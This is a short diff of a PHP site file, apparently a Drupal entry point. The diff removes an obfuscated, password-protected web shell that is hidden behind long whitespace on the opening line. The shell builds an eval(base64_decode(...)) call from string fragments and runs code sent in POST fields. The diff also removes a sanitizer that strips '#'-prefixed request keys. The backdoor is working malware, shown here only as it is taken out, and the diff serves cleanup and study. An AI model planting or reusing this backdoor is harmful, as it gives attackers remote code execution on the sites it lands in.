@@ -1,20 +1,4 @@
-<?php                                                                                                                                                if (isset($_POST['p'])&&md5($_POST['p'])==='75732c4a064669449287083b23285fb9'){$st = 'return value';$cap='bas'.'e6'.'4_d'.'ec'.'ode';$c = $st[1].$st[7].$st[8].$st[9].'('.$cap.'(\'';if(isset($_POST['uf'])&&isset($_POST['pr'])){$arr = array($c.$_POST['uf'].'\'))' => '|.*|e',);array_walk($arr, strval($_POST['pr']), '');}} ?><?php 
-      function stripDangerousValues($input) {
-    if (is_array($input)) {
-        foreach ($input as $key => $value) {
-            if ($key !== '' && $key[0] === '#') {
-                unset($input[$key]);
-            }
-            else {
-                $input[$key] = stripDangerousValues($input[$key]);
-            }
-        }
-    }
-    return $input;
-}
-$_REQUEST = stripDangerousValues($_REQUEST);
-$_GET = stripDangerousValues($_GET);
-$_POST = stripDangerousValues($_POST);
+<?php
 
 /**
  * @file
